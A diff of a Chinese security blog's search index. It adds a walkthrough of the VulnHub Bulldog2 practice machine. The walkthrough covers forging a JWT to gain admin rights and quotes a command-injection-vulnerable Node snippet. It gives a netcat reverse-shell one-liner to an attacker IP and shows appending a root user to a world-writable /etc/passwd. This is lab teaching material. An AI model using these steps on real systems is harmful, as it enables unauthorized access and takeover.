@@ -9,7 +9,7 @@
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
 <title>DAMOXILAI</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1628852900560">
+<link rel="shortcut icon" href="/favicon.ico?v=1628998205955">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -193,19 +193,19 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">7</span>
+        <span class="site-item-stat-count">8</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
     <div class="sidebar-item-box">
       <a href="">
-        <span class="site-item-stat-count">5</span>
+        <span class="site-item-stat-count">6</span>
         <span class="site-item-stat-name language" data-lan="category">分类</span>
       </a>
     </div>
     <div class="sidebar-item-box">
       <a href="/tags/">
-        <span class="site-item-stat-count">5</span>
+        <span class="site-item-stat-count">6</span>
         <span class="site-item-stat-name language" data-lan="tag">标签</span>
       </a>
     </div>
@@ -1050,6 +1050,129 @@
       <hr>
     </div>
     <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog2/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;靶机下载:&lt;/p&gt;
+&lt;p&gt;http://download.vulnhub.com/bulldog/Bulldog2.ova&lt;/p&gt;
+&lt;p&gt;或http://download.vulnhub.com/bulldog/Bulldog2.ova.torrent&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;靶机：ip暂未知&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;攻击机kali：192.168.0.150&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;二-实验步骤&#34;&gt;二、实验步骤&lt;/h2&gt;
+&lt;h4 id=&#34;1信息收集&#34;&gt;(1)信息收集&lt;/h4&gt;
+&lt;h5 id=&#34;1-主机发现&#34;&gt;1、主机发现&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997897503.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;找到目标主机：192.168.0.101&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2端口扫描操作系统扫描&#34;&gt;2.端口扫描操作系统扫描&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997907393.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;为防止漏扫，多扫描几次，可发现主机80端口开放http服务，Linux操作系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;2web渗透&#34;&gt;(2)Web渗透&lt;/h4&gt;
+&lt;h5 id=&#34;1访问80端口&#34;&gt;1.访问80端口&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997916629.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;没有什么收获&lt;/p&gt;
+&lt;h5 id=&#34;2扫描目录&#34;&gt;2.扫描目录&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997930403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;目录下没什么收获&lt;/p&gt;
+&lt;p&gt;首页调用了四个js文件，突破口可能在js文件里&lt;/p&gt;
+&lt;p&gt;访问该靶机80端口，查看其js，保存本地并用网上js美化工具把代码美化一下😂&lt;/p&gt;
+&lt;h5 id=&#34;3审计js代码&#34;&gt;3.审计js代码&lt;/h5&gt;
+&lt;p&gt;拿到代码，联想到刚才首页注册不了，注册页面功能没有。查看”register“关键字，有所发现：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997941542.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997950791.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;根据 js定义，我们可以使用 post提交来实现注册，但是注意&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;Content-Type必须要是：application/json 格式&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;&lt;strong&gt;post数据包内容必须按照js代码里的规范&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;4伪造数据包&#34;&gt;4.伪造数据包&lt;/h5&gt;
+&lt;p&gt;我们打开burp，构造数据包，发送后注册成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997959204.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;pre&gt;&lt;code&gt;{
+&amp;quot;name&amp;quot;: &amp;quot;linan&amp;quot;,
+
+&amp;quot;email&amp;quot;: &amp;quot;linan@qq.com&amp;quot;,
+
+&amp;quot;username&amp;quot;: &amp;quot;linan&amp;quot;,
+
+&amp;quot;password&amp;quot;: &amp;quot;123456&amp;quot;
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5 id=&#34;5登陆&#34;&gt;5.登陆&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997967431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;登陆成功&lt;/p&gt;
+&lt;p&gt;查看登陆抓包，发现可疑tonken&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997979110.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;6解密tonken并修改&#34;&gt;6.解密tonken并修改&lt;/h5&gt;
+&lt;p&gt;6.1根据提示，jwt解密&lt;/p&gt;
+&lt;p&gt;网址：https://jwt.io&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628997986624.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;有一个payload的键值对，值是我们的用户信息，发现多一行&amp;quot;auth_level&amp;quot;: &amp;quot;standard_user&amp;quot;，凭字面意思应该是用户等级的标志，可能是以此来判断用户权限的，到js代码中找这个关键字。&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998000185.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;pre&gt;&lt;code&gt;	if (&amp;quot;master_admin_user&amp;quot; == n.auth_level) return this.user = n, !0;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;6.2把&amp;quot;auth_level&amp;quot;: &amp;quot;&lt;font color=&#39;orange&#39;&gt;standard_user&lt;/font&gt;&amp;quot;替换&amp;quot;auth_level&amp;quot;: &amp;quot;&lt;font color=&#39;orange&#39;&gt;master_admin_user&lt;/font&gt;&amp;quot;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;success&amp;quot;:true,&amp;quot;token&amp;quot;:&amp;quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJsaW5hbiIsImVtYWlsIjoibGluYW5AcXEuY29tIiwidXNlcm5hbWUiOiJsaW5hbiIsImF1dGhfbGV2ZWwiOiJtYXN0ZXJfYWRtaW5fdXNlciJ9LCJpYXQiOjE2Mjg5NDc0MzQsImV4cCI6MTYyOTU1MjIzNH0.7N4Xj5dQuGWsv6iTWEyuXCWSsJcotzdX_EtM-uQEEhc&amp;quot;,&amp;quot;user&amp;quot;:{&amp;quot;name&amp;quot;:&amp;quot;linan&amp;quot;,&amp;quot;username&amp;quot;:&amp;quot;linan&amp;quot;,&amp;quot;email&amp;quot;:&amp;quot;linan@qq.com&amp;quot;,&amp;quot;auth_level&amp;quot;:&amp;quot;master_admin_user&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拦截返回的&lt;font color=&#39;red&#39;&gt;response数据包&lt;/font&gt;，修改tonken值&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998010721.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998018553.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;发现页面右上角，已经变为admin&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998032726.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;说明存在垂直越权漏洞&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h5 id=&#34;7命令执行漏洞-反弹shell&#34;&gt;7.命令执行漏洞 反弹shell&lt;/h5&gt;
+&lt;p&gt;7.1&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998040511.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;在GitHub上搜索Bulldog-2-The-Reckoning的代码，密码处存在命令执行漏洞&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user.js
+router.post(&#39;/linkauthenticate&#39;, (req, res, next) =&amp;gt; {
+  const username = req.body.password;
+  const password = req.body.password;
+
+  exec(`linkplus -u ${username} -p ${password}`, (error, stdout, stderr) =&amp;gt; {
+  if (error) {
+    console.error(`exec error: ${error}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+  console.log(`stderr: ${stderr}`);});
+原文链接：https://blog.csdn.net/qq_42288123/article/details/103534109
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;7.2反弹shell安排&lt;/p&gt;
+&lt;p&gt;命令：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.0.150 1234 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998050487.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;得到shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998163616.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;8提权&#34;&gt;8.提权&lt;/h5&gt;
+&lt;p&gt;8.1进入/etc目录下，发现password文件的权限大得要命，意味着我们可以随意修改，写入一个管理员权限的用户&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998171414.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;8.2可以仿照这个格式写入一个管理员权限的用户&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998180223.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;使用加密命令，得到一个加密后的密码。设定123456为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等），如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。所以，加密盐其实是必须的参数。&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;perl -le &#39;print crypt(&amp;quot;123456&amp;quot;,&amp;quot;aa&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到结果&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;18&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998187844.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;8.3将linan这个用户写入passwd文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &#39;linan:aaAN1ZUwjW7to:0:0:linan:/root:/bin/bash&#39; &amp;gt;&amp;gt; passwd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;写入成功&lt;/p&gt;
+&lt;p&gt;8.4直接su/sudo不行，python调用一个新的本地终端，再来su，成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;19&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1628998197641.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+">内网渗透之bulldog2</a>
+      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-bulldog/"" data-c="
